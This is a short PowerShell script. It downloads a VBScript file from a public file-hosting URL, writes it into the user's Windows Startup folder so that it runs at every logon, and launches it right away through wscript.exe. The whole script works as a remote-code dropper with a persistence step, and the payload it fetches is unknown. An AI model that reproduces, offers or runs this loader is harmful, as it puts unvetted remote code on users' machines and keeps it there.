# Define URL of the VBS file
$url = "https://files.catbox.moe/eqlsi1.vbs"

# Build the full path to the user's Startup folder
$startupFolder = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
$startupPath = Join-Path $startupFolder "eqlsi1.vbs"

# Create the Startup folder if it doesn't exist
if (-not (Test-Path $startupFolder)) {
    New-Item -ItemType Directory -Path $startupFolder | Out-Null
}

# Download the VBS file to the startup folder
Invoke-WebRequest -Uri $url -OutFile $startupPath

# Optionally run it immediately (in background)
Start-Process -FilePath "wscript.exe" -ArgumentList "`"$startupPath`"" -NoNewWindow
